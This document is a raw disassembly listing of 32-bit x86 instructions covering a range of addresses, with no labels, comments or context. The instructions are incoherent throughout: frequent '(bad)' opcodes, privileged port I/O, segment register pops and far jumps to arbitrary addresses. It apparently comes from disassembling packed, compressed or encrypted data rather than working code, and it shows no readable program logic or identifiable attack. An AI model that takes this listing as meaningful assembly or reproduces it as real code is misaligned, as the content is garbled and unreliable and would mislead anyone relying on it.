  41db75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db76:	cmc    
  41db77:	sub    BYTE PTR [esi+0x464a6bf5],al
  41db7d:	xor    ah,ch
  41db7f:	jle    0x41db3a
  41db81:	ins    DWORD PTR es:[edi],dx
  41db82:	mov    edx,0x62db3672
  41db87:	pop    ds
  41db88:	jnp    0x50168f1f
  41db8e:	cld    
  41db8f:	neg    BYTE PTR [ecx-0x12320e26]
  41db95:	(bad)  
  41db96:	jns    0x41db31
  41db98:	jbe    0x41dbc4
  41db9a:	mov    ebx,0xbab44404
  41db9f:	xchg   ecx,eax
  41dba0:	dec    esi
  41dba1:	int3   
  41dba2:	sbb    dh,BYTE PTR [edi]
  41dba4:	dec    eax
  41dba5:	mov    BYTE PTR [eax+edi*2],0x64
  41dba9:	mov    esi,0xc4ee6847
  41dbae:	repz mov edi,?
  41dbb1:	adc    eax,0x48dad438
  41dbb6:	(bad)  
  41dbb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbb8:	push   ecx
  41dbb9:	out    0x5b,al
  41dbbb:	mov    bh,BYTE PTR [ebp+0x7d267944]
  41dbc1:	inc    eax
  41dbc2:	and    eax,0xd15cfa9a
  41dbc7:	xchg   ebx,eax
  41dbc8:	jne    0x41dc47
  41dbca:	xchg   ebp,eax
  41dbcb:	(bad)
  41dbce:	and    BYTE PTR [esi-0x29],bh
  41dbd1:	fiadd  WORD PTR [edx+0x7f]
  41dbd4:	pop    es
  41dbd5:	pushf  
  41dbd6:	fistp  QWORD PTR [eax]
  41dbd8:	ja     0x41dc17
  41dbda:	pushf  
  41dbdb:	syscall 
  41dbdd:	mov    cl,0xd9
  41dbdf:	xchg   ebx,eax
  41dbe0:	or     dl,BYTE PTR [eax]
  41dbe2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbe3:	inc    ebp
  41dbe4:	jne    0x41db6e
  41dbe6:	xchg   ecx,eax
  41dbe7:	add    esp,DWORD PTR [ecx-0x27925118]
  41dbed:	in     al,dx
  41dbee:	or     BYTE PTR [esi+ebp*1-0x22d29ad1],dl
  41dbf5:	add    dl,ah
  41dbf7:	pop    esi
  41dbf8:	stos   DWORD PTR es:[edi],eax
  41dbf9:	aaa    
  41dbfa:	je     0x41dc25
  41dbfc:	scas   eax,DWORD PTR es:[edi]
  41dbfd:	rol    DWORD PTR [edx],0x4f
  41dc00:	pop    ebp
  41dc01:	xchg   BYTE PTR [edx],ch
  41dc03:	out    0xec,eax
  41dc05:	adc    al,0x10
  41dc07:	in     eax,0x4
  41dc09:	cs mov bh,0x9
  41dc0c:	push   ebp
  41dc0d:	mov    bl,0x80
  41dc0f:	lea    eax,[eax-0x48]
  41dc12:	out    0xbe,al
  41dc14:	js     0x41dc79
  41dc16:	ficomp WORD PTR [ebp+0xd29553f]
  41dc1c:	sbb    DWORD PTR [esi+0x78],ebp
  41dc1f:	or     BYTE PTR [edx+0x32263869],cl
  41dc25:	and    dh,BYTE PTR [edi-0x5c]
  41dc28:	adc    al,0x92
  41dc2a:	mov    bh,0xab
  41dc2c:	pop    edi
  41dc2d:	aad    0xbf
  41dc2f:	ds pop esi
  41dc31:	cwde   
  41dc32:	jns    0x41dc2e
  41dc34:	call   ebp
  41dc36:	inc    edx
  41dc37:	push   esp
  41dc38:	inc    ecx
  41dc39:	out    dx,eax
  41dc3a:	jmp    0x9cdbe8a9
  41dc3f:	adc    BYTE PTR [edx+0x4e5cbdf0],0x91
  41dc46:	jbe    0x41dc20
  41dc48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc49:	stos   BYTE PTR es:[edi],al
  41dc4a:	int    0xd9
  41dc4c:	push   es
  41dc4d:	adc    al,0x95
  41dc4f:	pop    es
  41dc50:	sub    DWORD PTR cs:[ecx+0x6e],edx
  41dc54:	add    dh,ch
  41dc56:	out    dx,al
  41dc57:	cld    
  41dc58:	aam    0x33
  41dc5a:	push   ecx
  41dc5b:	sub    edx,DWORD PTR [edx-0x1b]
  41dc5e:	jp     0x41dc02
  41dc60:	or     al,0x58
  41dc62:	cmc    
  41dc63:	xchg   edx,eax
  41dc64:	scas   al,BYTE PTR es:[edi]
  41dc65:	jecxz  0x41dcd6
  41dc67:	lahf   
  41dc68:	or     bh,BYTE PTR [ebp-0x2a]
  41dc6b:	sub    bh,BYTE PTR [ebp+0x41]
  41dc6e:	rcl    DWORD PTR [esi-0x6e],cl
  41dc71:	mov    dl,0xfa
  41dc73:	pop    esp
  41dc74:	ja     0x41dc1f
  41dc76:	cmc    
  41dc77:	mov    bh,BYTE PTR [esi-0x3a2156dd]
  41dc7d:	xlat   BYTE PTR ds:[ebx]
  41dc7e:	adc    ch,BYTE PTR [ebx]
  41dc80:	dec    ebx
  41dc81:	fwait
  41dc82:	in     eax,dx
  41dc83:	inc    edi
  41dc84:	psadbw mm4,QWORD PTR [ecx+0x3ddcf2cd]
  41dc8b:	xchg   esi,eax
  41dc8c:	push   esp
  41dc8d:	cmp    esi,ebp
  41dc8f:	daa    
  41dc90:	add    eax,0xa852591c
  41dc95:	mov    bl,0x97
  41dc97:	addr16 (bad) 
  41dc99:	shr    esi,cl
  41dc9b:	ret    
  41dc9c:	adc    BYTE PTR [ecx],cl
  41dc9e:	fldcw  WORD PTR [edi]
  41dca0:	and    BYTE PTR [ecx],0xb6
  41dca3:	call   0x87ee5452
  41dca8:	je     0x41dc3b
  41dcaa:	sub    ebp,esp
  41dcac:	push   edx
  41dcad:	xchg   esp,eax
  41dcae:	add    al,BYTE PTR [edx]
  41dcb0:	cli    
  41dcb1:	push   ebx
  41dcb2:	iret   
  41dcb3:	lahf   
  41dcb4:	stc    
  41dcb5:	fisttp QWORD PTR [edx]
  41dcb7:	xor    al,0xce
  41dcb9:	sub    eax,0x451c7b0e
  41dcbe:	(bad)  
  41dcbf:	xchg   esi,eax
  41dcc0:	jo     0x41dc4c
  41dcc2:	lods   al,BYTE PTR ds:[esi]
  41dcc3:	or     ebp,DWORD PTR [ebp+0x3d3d1fa2]
  41dcc9:	add    bl,BYTE PTR [ecx]
  41dccb:	hlt    
  41dccc:	pop    edi
  41dccd:	or     edi,ecx
  41dccf:	sbb    al,0x31
  41dcd1:	(bad)  
  41dcd3:	xor    cl,BYTE PTR [esi+0x77]
  41dcd6:	and    BYTE PTR [esi],dl
  41dcd8:	scas   eax,DWORD PTR es:[edi]
  41dcd9:	cwde   
  41dcda:	jo     0x41dcc1
  41dcdc:	mov    edi,0xfb5b219d
  41dce1:	xor    dl,BYTE PTR [eax+0x20]
  41dce4:	int3   
  41dce5:	ds into 
  41dce7:	mov    dl,0xbe
  41dce9:	pop    esp
  41dcea:	sub    DWORD PTR [edx],ecx
  41dcec:	ret    0x6340
  41dcef:	dec    BYTE PTR [edx+0x70cded4f]
  41dcf5:	test   al,0x8
  41dcf7:	dec    esp
  41dcf8:	out    dx,al
  41dcf9:	xor    eax,0xba9b7097
  41dcfe:	adc    eax,0x83fb60d5
  41dd03:	cmp    bl,BYTE PTR [edx+0x7e]
  41dd06:	jp     0x41dcab
  41dd08:	stos   BYTE PTR es:[edi],al
  41dd09:	ja     0x41dd16
  41dd0b:	outs   dx,BYTE PTR ds:[esi]
  41dd0c:	mov    bl,0xec
  41dd0e:	sub    ah,bl
  41dd10:	lahf   
  41dd11:	xor    DWORD PTR [ecx+0x5f46c337],edx
  41dd17:	lds    ebp,FWORD PTR [ecx+0x6fecc8e8]
  41dd1d:	xchg   DWORD PTR [edi],esi
  41dd1f:	xchg   esp,eax
  41dd20:	imul   edx,DWORD PTR [ebx],0xfc9e7a03
  41dd26:	dec    edx
  41dd27:	and    eax,0xa23cd8bd
  41dd2c:	pop    ecx
  41dd2d:	cmc    
  41dd2e:	mov    ch,0xaf
  41dd30:	and    al,0x52
  41dd32:	mov    DWORD PTR [ebx+0x6bc9be56],ebp
  41dd38:	jmp    0x41dd54
  41dd3a:	push   edx
  41dd3b:	retf   0x39d5
  41dd3e:	add    al,0xfd
  41dd40:	cmp    eax,0xeb3d4cca
  41dd45:	ins    DWORD PTR es:[edi],dx
  41dd46:	dec    edi
  41dd47:	(bad)  
  41dd48:	jb     0x41dd21
  41dd4a:	mov    ecx,0x774018e5
  41dd4f:	cmp    cl,0x8f
  41dd52:	adc    al,0xb8
  41dd54:	stos   DWORD PTR es:[edi],eax
  41dd55:	mov    ah,0xa5
  41dd57:	cli    
  41dd58:	cdq    
  41dd59:	out    0x36,al
  41dd5b:	bound  eax,QWORD PTR [edi]
  41dd5d:	xchg   edi,eax
  41dd5e:	adc    ebp,ecx
  41dd60:	rol    DWORD PTR [edx-0x461e8b6f],cl
  41dd66:	xchg   ecx,eax
  41dd67:	lahf   
  41dd68:	inc    edx
  41dd69:	leave  
  41dd6a:	cld    
  41dd6b:	xchg   BYTE PTR [eax+0x565b853d],al
  41dd71:	and    eax,DWORD PTR [esp+eiz*2]
  41dd74:	mov    al,0x5b
  41dd76:	adc    al,0x69
  41dd78:	repnz inc edi
  41dd7a:	mov    esi,0x7b45742
  41dd7f:	aad    0xc3
  41dd81:	jge    0x41dd9b
  41dd83:	sbb    bl,bh
  41dd85:	fdivr  DWORD PTR [edi]
  41dd87:	mov    ah,0xc0
  41dd89:	add    dl,BYTE PTR es:[ebp+0x218502af]
  41dd90:	scas   eax,DWORD PTR es:[edi]
  41dd91:	imul   edx,ecx,0x2d
  41dd94:	sub    al,0xc5
  41dd96:	stos   BYTE PTR es:[edi],al
  41dd97:	mul    DWORD PTR [ecx+edx*4]
  41dd9a:	ins    DWORD PTR es:[edi],dx
  41dd9b:	cli    
  41dd9c:	pop    ds
  41dd9d:	add    BYTE PTR [ebp-0x17],cl
  41dda0:	jmp    0x41dd2c
  41dda2:	cvtpi2ps xmm0,QWORD PTR [esi-0x12]
  41dda6:	or     eax,0x67d09ba8
  41ddab:	sbb    al,0xb3
  41ddad:	mov    ebp,?
  41ddaf:	mov    esp,0xe5638b68
  41ddb4:	int    0x57
  41ddb6:	xor    bh,BYTE PTR [edx+0x7266b4d9]
  41ddbc:	(bad)  
  41ddbd:	mov    eax,0x6fb44c0
  41ddc2:	test   al,0x52
  41ddc4:	call   0x5d9b577f
  41ddc9:	shr    BYTE PTR [edx-0x61],0x68
  41ddcd:	xchg   DWORD PTR [ebx+0x6d],ebx
  41ddd0:	das    
  41ddd1:	imul   ecx,DWORD PTR [esi],0x59bee153
  41ddd7:	xchg   DWORD PTR [edx-0x4f],eax
  41ddda:	sbb    al,0x6e
  41dddc:	xchg   ecx,eax
  41dddd:	add    BYTE PTR [edi+ebx*4+0x73],dl
  41dde1:	cmp    ebp,DWORD PTR [edi+0x63211339]
  41dde7:	mov    ch,0x2b
  41dde9:	aad    0xa
  41ddeb:	inc    ebp
  41ddec:	(bad)  
  41ddee:	add    BYTE PTR [ebp-0x46],bh
  41ddf1:	or     DWORD PTR [ecx+0x50],ecx
  41ddf4:	rcl    eax,1
  41ddf6:	int3   
  41ddf7:	add    esi,0x2bb8a8f0
  41ddfd:	dec    edi
  41ddfe:	dec    esp
  41ddff:	cs inc esp
  41de01:	sar    eax,cl
  41de03:	cdq    
  41de04:	pop    edx
  41de05:	test   BYTE PTR [ecx+ebx*4+0x5d066019],bl
  41de0c:	out    0xd7,al
  41de0e:	imul   edi,DWORD PTR [ebx],0x5a291f7c
  41de14:	fdiv   DWORD PTR [ebx+0x7d451d71]
  41de1a:	sub    eax,0x28198253
  41de1f:	jg     0x41ddb4
  41de21:	icebp  
  41de22:	sbb    DWORD PTR [edi+0x2739b221],eax
  41de28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de29:	jge    0x41ddb3
  41de2b:	shl    BYTE PTR [ecx+0x7f],0xce
  41de2f:	test   esi,esp
  41de31:	xor    BYTE PTR [edx],bl
  41de33:	repnz gs push cs
  41de36:	mov    esi,0x8add98a4
  41de3b:	aam    0xb
  41de3d:	pop    edi
  41de3e:	adc    DWORD PTR ds:0x9b1de547,esp
  41de44:	sar    BYTE PTR [ebp-0x63685a6d],cl
  41de4a:	cmp    DWORD PTR [ecx],ecx
  41de4c:	adc    al,0x16
  41de4e:	ja     0x41de2e
  41de50:	lods   al,BYTE PTR ds:[esi]
  41de51:	clc    
  41de52:	jmp    0xc99556b5
  41de57:	scas   eax,DWORD PTR es:[edi]
  41de58:	mov    ch,0x4e
  41de5a:	sbb    al,BYTE PTR [edi]
  41de5c:	leave  
  41de5d:	(bad)  
  41de5e:	pop    ds
  41de5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de60:	sbb    DWORD PTR [ebp-0x3ef33701],ecx
  41de66:	jmp    0x5378513f
  41de6b:	cs pop ebx
  41de6d:	aaa    
  41de6e:	xlat   BYTE PTR ds:[ebx]
  41de6f:	shl    DWORD PTR [ebx+0xd88edd4],0x42
  41de76:	hlt    
  41de77:	xlat   BYTE PTR ds:[ebx]
  41de78:	out    0x95,eax
  41de7a:	adc    BYTE PTR [eax-0x36],al
  41de7d:	jb     0x41de5e
  41de7f:	sub    DWORD PTR [ebx+0x33],0xaa5ec2c6
  41de86:	call   0xfa76716e
  41de8b:	loopne 0x41de87
  41de8d:	xchg   ebp,eax
  41de8e:	jnp    0x41df0f
  41de90:	es std 
  41de92:	push   0xffffffa4
  41de94:	mov    ebp,0x657bbd7
  41de99:	ins    BYTE PTR es:[edi],dx
  41de9a:	cmp    BYTE PTR [ebx-0x3cd9d323],bl
  41dea0:	in     eax,dx
  41dea1:	mov    edi,0x76239aeb
  41dea6:	cmp    edi,DWORD PTR [ecx-0x22702db5]
  41deac:	hlt    
  41dead:	dec    eax
  41deae:	dec    ecx
  41deaf:	inc    eax
  41deb0:	add    BYTE PTR [ebp+0x3c],0xcb
  41deb4:	and    eax,0xdb7f72b9
  41deb9:	stos   DWORD PTR es:[edi],eax
  41deba:	in     eax,dx
  41debb:	inc    ebx
  41debc:	dec    ebx
  41debd:	push   0xb55a6f2e
  41dec2:	in     al,0x88
  41dec4:	(bad)  
  41dec5:	dec    esi
  41dec6:	sbb    DWORD PTR [edi-0x6c3c1dd9],edx
  41decc:	arpl   WORD PTR [ecx+ebp*8+0x5f2b4211],dx
  41ded3:	pop    ebx
  41ded4:	inc    ecx
  41ded5:	scas   al,BYTE PTR es:[edi]
  41ded6:	adc    ch,al
  41ded8:	pop    ss
  41ded9:	cld    
  41deda:	fst    QWORD PTR [eax+0xc6]
  41dee0:	add    BYTE PTR [eax],al
  41dee2:	loope  0x41de68
  41dee4:	xchg   al,dh
  41dee6:	out    0xf2,eax
  41dee8:	not    DWORD PTR [ebp-0x25c4ffdf]
  41deee:	add    ch,ah
  41def0:	cli    
  41def1:	sbb    BYTE PTR [edx],0x5a
  41def4:	add    DWORD PTR [eax],eax
  41def6:	repz add al,0x0
  41def9:	add    BYTE PTR [edi],dh
  41defb:	mov    dl,0x93
  41defd:	pop    edx
  41defe:	es out 0x9a,eax
  41df01:	ds (bad) 
  41df03:	jnp    0x41debf
  41df05:	mov    bl,0x6b
  41df07:	aam    0x73
  41df09:	push   edi
  41df0a:	test   DWORD PTR [eax+0x875015a],esp
  41df10:	jg     0x41df8c
  41df12:	sub    al,0xc1
  41df14:	mov    BYTE PTR [ecx+ebx*1-0x116abd43],0x30
  41df1c:	in     eax,dx
  41df1d:	jg     0x41df89
  41df1f:	inc    esi
  41df20:	jmp    0x30867e8f
  41df25:	lea    ecx,[edi]
  41df27:	test   al,0xc3
  41df29:	retf   
  41df2a:	lock aas 
  41df2c:	or     BYTE PTR [ecx+0x6d6421b8],dl
  41df32:	mov    eax,DWORD PTR [edx-0x3af2234c]
  41df38:	mov    ds:0x6558e2e4,al
  41df3d:	push   0xe47661a6
  41df42:	adc    eax,0x364803d4
  41df47:	idiv   ebp
  41df49:	enter  0x9945,0x76
  41df4d:	push   ss
  41df4e:	ins    DWORD PTR es:[edi],dx
  41df4f:	ja     0x41df49
  41df51:	shl    BYTE PTR [edi],cl
  41df53:	js     0x41dfcf
  41df55:	ins    DWORD PTR es:[edi],dx
  41df56:	push   ds
  41df57:	fs sub ebx,ebp
  41df5a:	lods   eax,DWORD PTR ds:[esi]
  41df5b:	add    cl,BYTE PTR [ebx]
  41df5d:	push   ecx
  41df5e:	fdivr  DWORD PTR [esi]
  41df60:	gs mov ebp,0xd88bf10a
  41df66:	outs   dx,BYTE PTR ds:[esi]
  41df67:	fbstp  TBYTE PTR [ecx]
  41df69:	push   es
  41df6a:	sbb    DWORD PTR [eax],eax
  41df6c:	out    0x1e,eax
  41df6e:	jne    0x41df04
  41df70:	in     al,0xae
  41df72:	retf   0x3036
  41df75:	(bad)  
  41df76:	fstp   DWORD PTR [edi+0x2a]
  41df79:	inc    esi
  41df7a:	jp     0x41dffb
  41df7c:	or     edx,DWORD PTR [edx]
  41df7e:	sbb    BYTE PTR [ecx+0x5a0a99be],ch
  41df84:	out    dx,eax
  41df85:	pop    ss
  41df86:	pop    esp
  41df87:	retf   
  41df88:	bound  esp,QWORD PTR [eax]
  41df8a:	push   0x10
  41df8c:	cli    
  41df8d:	mov    ah,0xdc
  41df8f:	loop   0x41e002
  41df91:	or     esi,ecx
  41df93:	cmc    
  41df94:	fsubrp st(5),st
  41df96:	push   cs
  41df97:	pop    ecx
  41df98:	dec    esi
  41df99:	xlat   BYTE PTR ds:[ebx]
  41df9b:	addr16 test eax,0xdd02df17
  41dfa1:	push   eax
  41dfa2:	pop    ds
  41dfa3:	pop    ss
  41dfa4:	jnp    0x41dfa7
  41dfa6:	pop    ds
  41dfa7:	ror    WORD PTR [ebp-0x68],cl
  41dfab:	jb     0x41dfe5
  41dfad:	adc    DWORD PTR [edi+0x37766bab],eax
  41dfb3:	pop    es
  41dfb4:	loope  0x41e035
  41dfb6:	retf   
  41dfb7:	jbe    0x41dff7
  41dfb9:	in     eax,dx
  41dfba:	inc    edi
  41dfbb:	aam    0xf8
  41dfbd:	shl    BYTE PTR [eax+0x65],cl
  41dfc0:	inc    edx
  41dfc1:	xor    DWORD PTR [ebx+ebp*1+0x67],esi
  41dfc5:	cdq    
  41dfc6:	jecxz  0x41dfa2
  41dfc8:	sahf   
  41dfc9:	out    0xca,al
  41dfcb:	test   eax,0x873a9177
  41dfd0:	sbb    al,dh
  41dfd2:	rcl    DWORD PTR [esi],0xf0
  41dfd5:	jle    0x41df93
  41dfd7:	pushf  
  41dfd8:	or     DWORD PTR [esi+0x64],0xf4a7b4e7
  41dfdf:	data16 jae 0x41df75
  41dfe2:	ret    0x1e4c
  41dfe5:	xchg   ecx,eax
  41dfe7:	dec    esi
  41dfe9:	data16 sub cl,BYTE PTR ds:0xca435049
  41dff0:	fcomp  QWORD PTR [eax+0x36586fc3]
  41dff6:	arpl   WORD PTR [ebx+0x525b35f7],bp
  41dffc:	ins    BYTE PTR es:[edi],dx
  41dffd:	sbb    ebx,DWORD PTR [ecx]
  41dfff:	add    cl,BYTE PTR [eax]
  41e001:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e003:	(bad)  
  41e004:	aad    0xe
  41e006:	pop    ds
  41e007:	aas    
  41e008:	out    0x91,eax
  41e00a:	fld    DWORD PTR [ebx+ecx*1+0x4dcd0964]
  41e011:	ins    BYTE PTR es:[edi],dx
  41e012:	fs loop 0x41e053
  41e015:	sbb    BYTE PTR [ecx],dl
  41e017:	mov    eax,DWORD PTR [edx-0x4ba6523f]
  41e01d:	mov    ah,0xf0
  41e01f:	and    DWORD PTR [ecx-0x3cd0e74a],edi
  41e025:	in     al,0x9a
  41e027:	ret    0x656
  41e02a:	fwait
  41e02b:	(bad)  
  41e02c:	std    
  41e02d:	pushf  
  41e02e:	add    dh,BYTE PTR [edx+ebp*8-0x20]
  41e032:	mov    dh,bh
  41e034:	and    ebp,DWORD PTR ds:0xab24f988
  41e03a:	push   edi
  41e03b:	adc    DWORD PTR [ebp+ebx*8-0x12f6a402],edx
  41e042:	sbb    bh,BYTE PTR [ecx*2+0x64079bee]
  41e049:	push   0x7121d468
  41e04e:	inc    eax
  41e04f:	cs pushf 
  41e051:	or     edi,DWORD PTR [edi-0x4c5cdd8f]
  41e057:	mov    esp,0xc3995226
  41e05c:	cmp    al,0x4
  41e05e:	test   al,0xb
  41e060:	(bad)  
  41e061:	cmp    eax,0xe1d22642
  41e066:	shl    edi,0x93
  41e069:	cmp    eax,0x8b088834
  41e06f:	or     DWORD PTR [eax+ebp*2],eax
  41e072:	mov    bl,0x7d
  41e074:	loop   0x41e026
  41e076:	xchg   ebx,eax
  41e077:	pop    ebp
  41e078:	cmp    al,BYTE PTR [ebp+0x61]
  41e07b:	fnsave [eax+0x64602835]
  41e081:	or     al,0xc2
  41e083:	fcomp  DWORD PTR [edx+edi*8]
  41e086:	adc    DWORD PTR [ebp-0x220999a3],edx
  41e08c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e08d:	sbb    esi,ecx
  41e08f:	xchg   ebp,eax
  41e090:	pop    ds
  41e091:	xor    DWORD PTR [edi+ecx*4+0x26],esi
  41e095:	adc    edi,DWORD PTR [esi+0x60]
  41e098:	js     0x41e0f9
  41e09a:	mov    dh,BYTE PTR [edx]
  41e09c:	cli    
  41e09d:	std    
  41e09e:	push   esi
  41e09f:	jno    0x41e0db
  41e0a1:	loope  0x41e028
  41e0a3:	or     ch,dh
  41e0a5:	pop    es
  41e0a6:	ds pushf 
  41e0a8:	inc    ebx
  41e0a9:	xchg   ecx,eax
  41e0aa:	sub    ah,BYTE PTR [edx-0x1d]
  41e0ad:	imul   eax,edx,0xffffffdd
  41e0b0:	jbe    0x41e10e
  41e0b2:	adc    eax,0x37b15358
  41e0b7:	and    DWORD PTR [esi],0x41
  41e0ba:	xor    BYTE PTR [ecx-0x59],al
  41e0bd:	arpl   WORD PTR [edi+0x47],cx
  41e0c0:	std    
  41e0c1:	test   BYTE PTR [ecx],0x88
  41e0c4:	cmp    BYTE PTR [esi+eiz*1+0x71],0x78
  41e0c9:	mov    esp,0x7049fe6a
  41e0ce:	pop    es
  41e0cf:	add    eax,0x947a00c9
  41e0d4:	sbb    al,0xaa
  41e0d6:	pop    ss
  41e0d7:	je     0x41e060
  41e0d9:	popf   
  41e0da:	mov    al,ds:0xb53b3e90
  41e0df:	call   0xe0ce:0x8f151742
  41e0e6:	test   ah,al
  41e0e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e0e9:	(bad)  [edx+0x6b]
  41e0ec:	mov    ds:0xac290eec,eax
  41e0f1:	popf   
  41e0f2:	xchg   esp,eax
  41e0f3:	add    DWORD PTR [ebx+0x2],ebp
  41e0f6:	cmp    al,0x4b
  41e0f8:	xchg   dh,bl
  41e0fa:	sahf   
  41e0fb:	int    0x97
  41e0fd:	and    ebx,DWORD PTR ds:0x4c3ac6ad
  41e103:	xchg   BYTE PTR [ebp-0x55],dl
  41e106:	ds xor eax,0x64fb4192
  41e10c:	xorps  xmm7,XMMWORD PTR [ecx-0x5eef9032]
  41e113:	repnz inc esi
  41e115:	ins    BYTE PTR es:[edi],dx
  41e116:	sbb    BYTE PTR [edi+eiz*4],0xc6
  41e11a:	iret   
  41e11b:	push   0xc7cb5d9a
  41e120:	cdq    
  41e121:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e122:	(bad)  
  41e123:	sub    cl,BYTE PTR [edx+0x3d74add4]
  41e129:	out    0xc4,eax
  41e12b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e12c:	or     BYTE PTR es:[ebp-0x49],0xc4
  41e131:	cmp    DWORD PTR [ecx+0x3b9c2aef],0xffffffc2
  41e138:	pop    es
  41e139:	stc    
  41e13a:	bound  esp,QWORD PTR [esp+ebp*2+0x16]
  41e13e:	loop   0x41e19b
  41e140:	ret    0x9275
  41e143:	cmp    eax,0x5ca102f1
  41e148:	mov    cl,0x83
  41e14a:	push   0x34
  41e14c:	jns    0x41e160
  41e14e:	ins    BYTE PTR es:[edi],dx
  41e14f:	jl     0x41e16d
  41e151:	push   cs
  41e152:	sbb    dl,dh
  41e154:	cwde   
  41e155:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e156:	int3   
  41e157:	mov    BYTE PTR [edi-0x61],ch
  41e15a:	in     eax,dx
  41e15b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e15c:	pusha  
  41e15d:	loopne 0x41e137
  41e15f:	(bad)  
  41e160:	ret    0xd0e1
  41e163:	xlat   BYTE PTR ds:[ebx]
  41e164:	fdiv   DWORD PTR [edi+0x55c136af]
  41e16a:	or     edx,DWORD PTR ds:0x49fb9a12
  41e170:	enter  0x2baa,0x7d
  41e174:	test   DWORD PTR ds:0xe2223aa,ebx
  41e17a:	mov    eax,edi
  41e17c:	inc    edx
  41e17d:	ss push esi
  41e17f:	inc    eax
  41e180:	dec    ebx
  41e181:	mov    cl,0xb0
  41e183:	xchg   ebx,eax
  41e184:	mov    dl,BYTE PTR [edx+0x59]
  41e187:	rcl    BYTE PTR [edx-0x7c],1
  41e18a:	jno    0x41e14c
  41e18c:	inc    eax
  41e18d:	(bad)  
  41e18f:	adc    bl,BYTE PTR [eax]
  41e191:	into   
  41e192:	not    BYTE PTR [edx-0x54]
  41e195:	fisub  WORD PTR [esp+eax*8]
  41e198:	out    0xef,al
  41e19a:	(bad)  
  41e19b:	lock lods eax,DWORD PTR ds:[esi]
  41e19d:	repnz cmp ah,dl
  41e1a0:	js     0x41e1d9
  41e1a2:	push   edx
  41e1a3:	pop    ecx
  41e1a4:	pop    ds
  41e1a5:	sbb    al,0xfe
  41e1a7:	mov    es,ebp
  41e1a9:	and    eax,DWORD PTR [ebx]
  41e1ab:	inc    edi
  41e1ac:	adc    BYTE PTR [eax-0x4d2765a0],cl
  41e1b2:	inc    esp
  41e1b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e1b4:	(bad)
  41e1b7:	mov    eax,ds:0x4d414e71
  41e1bc:	cmp    eax,DWORD PTR [ebp-0x3]
  41e1bf:	fcom   QWORD PTR ds:0x9a1e6804
  41e1c5:	call   0x86d7:0x7e90a867
  41e1cc:	lods   al,BYTE PTR ds:[esi]
  41e1cd:	js     0x41e216
  41e1cf:	and    BYTE PTR [esi+0x39011f67],cl
  41e1d5:	or     DWORD PTR [edx],ecx
  41e1d7:	enter  0x4d58,0xd4
  41e1db:	mov    edx,0x91a9f9b8
  41e1e0:	das    
  41e1e1:	ret    0xe370
  41e1e4:	mov    esi,DWORD PTR [esi-0x58fb8bf]
  41e1ea:	add    DWORD PTR [edi-0x6d577544],eax
  41e1f0:	pop    eax
  41e1f1:	push   ecx
  41e1f2:	mov    al,ds:0x6a014da2
  41e1f7:	mov    bh,0x36
  41e1f9:	inc    ecx
  41e1fa:	jns    0x41e217
  41e1fc:	pop    ecx
  41e1fd:	jmp    0xf154:0x7d69e7c4
  41e204:	sbb    BYTE PTR [esi],0xb6
  41e207:	dec    esi
  41e208:	fcom   DWORD PTR [eax]
  41e20a:	mov    ebp,0x23c11963
  41e20f:	rcr    DWORD PTR [esi+edx*8-0x35],0x12
  41e214:	cmp    DWORD PTR [ebx-0x19a42338],0x7d9080db
  41e21e:	dec    ebp
  41e21f:	mov    dh,0x7d
  41e221:	mov    al,ds:0xa6c8f81a
  41e226:	mov    ebp,0xba0c7338
  41e22b:	sti    
  41e22c:	nop
  41e22d:	les    ecx,FWORD PTR [edx+0x2dc64bea]
  41e233:	xchg   edx,ebp
  41e235:	shr    DWORD PTR [ecx+0x7d],cl
  41e238:	add    ebx,0x8ddea6dc
  41e23e:	aas    
  41e23f:	dec    esp
  41e240:	or     DWORD PTR [ecx],edi
  41e242:	ret    0x95e4
  41e245:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e246:	mov    edx,0xfd1f9279
  41e24b:	mov    edi,0xb4ec4875
  41e250:	nop
  41e251:	xor    ebp,edi
  41e253:	icebp  
  41e254:	sti    
  41e255:	or     esp,DWORD PTR [edi-0xb]
  41e258:	stc    
  41e259:	mov    ah,0xf4
  41e25b:	jl     0x41e201
  41e25d:	inc    eax
  41e25e:	push   ss
  41e25f:	(bad)  
  41e260:	mov    ah,0xa7
  41e262:	mov    al,0x2c
  41e264:	mov    al,0x8e
  41e266:	out    0xa7,eax
  41e268:	jecxz  0x41e284
  41e26a:	and    DWORD PTR [ecx],ebx
  41e26c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e26d:	repz push edi
  41e26f:	dec    ecx
  41e270:	sub    eax,DWORD PTR [edx+0x1d]
  41e273:	xchg   esi,ecx
  41e275:	imul   esp,DWORD PTR [eax],0x931c23c6
  41e27b:	mov    edi,DWORD PTR [edx+0x2f1c5f84]
  41e281:	cmp    DWORD PTR [esi-0x14c32f52],edi
  41e287:	into   
  41e288:	ja     0x41e266
  41e28a:	mov    ecx,0x2f262b1f
  41e28f:	out    0x7,eax
  41e291:	aas    
  41e292:	mov    edi,0x15baf1b2
  41e297:	push   edx
  41e298:	push   ebx
  41e299:	adc    dh,BYTE PTR [ebp+0x54]
  41e29c:	bound  ecx,QWORD PTR [ebx+0x4f3a6274]
  41e2a2:	sbb    BYTE PTR [edx-0x49cb3a81],bh
  41e2a8:	in     eax,dx
  41e2a9:	or     esp,DWORD PTR [ebx-0x4d501ce9]
  41e2af:	pop    ds
  41e2b0:	push   edi
  41e2b1:	push   esp
  41e2b2:	pop    ds
  41e2b3:	mov    eax,0x9b238bc1
  41e2b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e2b9:	repnz clc 
  41e2bb:	clc    
  41e2bc:	enter  0xe6d5,0x10
